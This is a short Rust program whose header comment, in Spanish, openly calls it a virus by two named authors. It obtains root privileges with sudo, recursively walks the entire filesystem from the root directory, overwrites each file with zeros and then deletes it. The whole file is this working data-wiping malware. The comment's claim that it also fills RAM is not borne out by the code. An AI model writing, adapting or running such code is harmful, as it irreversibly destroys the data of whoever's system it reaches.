// Daniel Hernández Toledo
// Daniel Alejandro Osornio Lopez
// Virus para poder llenar toda la memoria ram y posteriormente borrar todos los archivos.

use std::fs::{OpenOptions, read_dir, remove_file};
use std::io::{Read, Write};
use std::path::{Path, PathBuf};

use std::sync::mpsc::{channel, Receiver, Sender};
use std::sync::Mutex;
use std::thread::sleep;
use std::time::Duration;

fn walk <T: FnOnce(PathBuf, &Mutex<usize>, &Sender<bool>)+Copy> (path:PathBuf, action:T, limite: &Mutex<usize>, cx: &Receiver<bool>, rx: &Sender<bool>) -> () {
    let archivos = read_dir(&path).unwrap();
    for archivo in archivos {
        let archivo = archivo.unwrap();
        if archivo.file_type().unwrap().is_dir() {
            walk(archivo.path(), action, limite, cx, rx);
        } else if archivo.file_type().unwrap().is_file(){
            if *limite.lock().unwrap() == 0 {
                loop {
                    cx.recv().unwrap();
                        if *limite.lock().unwrap() > 0 {
                            break;
                    }
                }
            }
            action(archivo.path(), limite, rx);
            sleep(Duration::from_secs(1));
        }
    }
}

fn main() {
    let mut limit = Mutex::new(100);
    sudo::escalate_if_needed().unwrap();
    let (mut rx, mut cx) : (Sender<bool>, Receiver<bool>) = channel();
    walk("/".into(), |p, limite, rx|{
        *limite.lock().unwrap() -= 1;
        let file = OpenOptions::new().write(true).open(&p);
        if let Ok(mut file) = file {
            file.write_all(&vec![0; file.metadata().unwrap().len().try_into().unwrap()]).unwrap();
            remove_file(p).unwrap();
        }
        *limite.lock().unwrap() += 1;
        rx.send(true).unwrap();
    }, &limit, &cx, &rx )
}
